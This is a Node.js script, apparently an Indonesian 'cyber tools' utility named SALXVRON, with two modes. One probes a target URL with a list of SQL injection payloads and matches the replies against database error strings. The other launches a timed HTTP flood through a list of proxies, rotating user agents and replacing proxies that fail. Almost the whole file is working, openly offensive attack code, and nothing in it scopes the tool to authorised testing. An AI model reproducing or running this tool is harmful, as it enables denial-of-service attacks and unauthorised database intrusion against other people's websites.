import axios from 'axios';
import userAgent from 'random-useragent';
import chalk from 'chalk';
import ora from 'ora';
import figlet from 'figlet';
import gradient from 'gradient-string';
import moment from 'moment';
import url from 'url';
import fs from 'fs';
import HttpsProxyAgent from 'https-proxy-agent';

const sqlPayloads = [
    "' OR 1=1 --", "\" OR 1=1 --", "' UNION SELECT null, null, null --",
    "1' AND 1=1 --", "1' AND 1=2 --", "' OR sleep(5) --", "\" OR sleep(5) --",
    "' AND benchmark(5000000,MD5(1)) --", "\" AND benchmark(5000000,MD5(1)) --"
];

const sqlErrors = [
    "SQL syntax", "mysql_fetch", "ORA-01756", "Microsoft OLE DB Provider",
    "Unclosed quotation mark", "You have an error in your SQL syntax",
    "pg_query(): Query failed", "syntax error at or near"
];

if (process.argv.length < 4) {
    console.log(chalk.red("❌ Gunakan: node salxvron.js <URL> <mode>"));
    console.log(chalk.yellow("Contoh:"));
    console.log(chalk.green("   node salxvron.js https://target.com?id=1 sqli"));
    console.log(chalk.green("   node salxvron.js https://target.com ddos"));
    process.exit(1);
}

const target = process.argv[2];
const mode = process.argv[3];
const parsedUrl = url.parse(target, true);
const startTime = moment().format('YYYY-MM-DD HH:mm:ss');

// Tampilkan Logo SALXVRON
console.log(gradient.pastel(figlet.textSync("SALX VRON", { horizontalLayout: "full" })));
console.log(chalk.blue.bold(`\n🚀 SALXVRON - Cyber Tools`));
console.log(chalk.green(`🛡️ Target : ${target}`));
console.log(chalk.yellow(`⏳ Time: ${startTime}`));

// Fungsi SQL Injection Scanner
async function scanSQLi(urlTarget) {
    console.log(chalk.magentaBright("\n🔎 Scanning SQL Injection:\n"));

    const spinner = ora(chalk.yellow(`Menganalisis ${urlTarget}...`)).start();
    let vulnCount = 0;

    for (let payload of sqlPayloads) {
        let testURL = `${urlTarget}${encodeURIComponent(payload)}`;
        let headers = {
            'User-Agent': userAgent.getRandom(),
            'Referer': 'https://google.com',
        };

        try {
            let response = await axios.get(testURL, {
                timeout: 10000,
                headers: headers
            });

            let responseText = response.data.toString();

            if (sqlErrors.some(error => responseText.includes(error))) {
                spinner.fail(chalk.redBright(`🔥 [VULNERABLE] ${testURL}`));
                vulnCount++;
            }

            if (response.status === 500 || response.status === 403) {
                spinner.warn(chalk.yellowBright(`⚠️ [POTENTIALLY VULNERABLE] ${testURL}`));
            }

        } catch (error) {
            continue;
        }
    }

    if (vulnCount === 0) {
        spinner.succeed(chalk.greenBright(`✅ [SAFE] ${urlTarget}`));
    }
}

// Fungsi DDoS dengan Proxy + Auto Switch
async function ddosAttack(urlTarget, duration = 30, proxyFile = "proxies.txt") {
    console.log(chalk.redBright("\n🔥 Memulai DDoS Attack dengan Proxy:"));
    console.log(chalk.cyan(`🔫 Menyerang ${urlTarget} selama ${duration} detik...\n`));

    if (!fs.existsSync(proxyFile)) {
        console.log(chalk.red(`❌ File proxy ${proxyFile} tidak ditemukan!`));
        process.exit(1);
    }

    let proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(Boolean);
    if (proxies.length === 0) {
        console.log(chalk.red("❌ Tidak ada proxy yang tersedia di file!"));
        process.exit(1);
    }

    const attackStart = Date.now();
    const attackEnd = attackStart + duration * 1000;
    let requestCount = 0;

    async function sendRequest(proxy) {
        while (Date.now() < attackEnd) {
            try {
                const agent = new HttpsProxyAgent(`http://${proxy}`);
                await axios.get(urlTarget, {
                    headers: { 'User-Agent': userAgent.getRandom() },
                    httpsAgent: agent,
                    timeout: 5000
                }).then(() => {
                    console.log(chalk.greenBright(`[+] Request sent via ${proxy}`));
                    requestCount++;
                }).catch(() => {
                    console.log(chalk.yellow(`⚠️ Proxy ${proxy} gagal, mengganti proxy...`));
                    proxies = proxies.filter(p => p !== proxy); // Hapus proxy yang gagal
                    if (proxies.length > 0) {
                        sendRequest(proxies[Math.floor(Math.random() * proxies.length)]); // Ganti proxy baru
                    }
                });
            } catch (error) {
                console.log(chalk.yellow(`⚠️ Proxy ${proxy} gagal, mencoba lagi...`));
            }
        }
    }

    console.log(chalk.yellow(`🕵️‍♂️ Menggunakan ${proxies.length} proxy untuk DDoS...`));

    await Promise.all(proxies.map(proxy => sendRequest(proxy)));

    console.log(chalk.blueBright(`\n✅ DDoS Selesai! ${requestCount} permintaan terkirim.`));
}

// Pilih mode operasi
if (mode === "sqli") {
    scanSQLi(target);
} else if (mode === "ddos") {
    ddosAttack(target, 30, "proxies.txt");
} else {
    console.log(chalk.red("\n❌ Mode tidak dikenal! Pilih 'sqli' atau 'ddos'"));
}
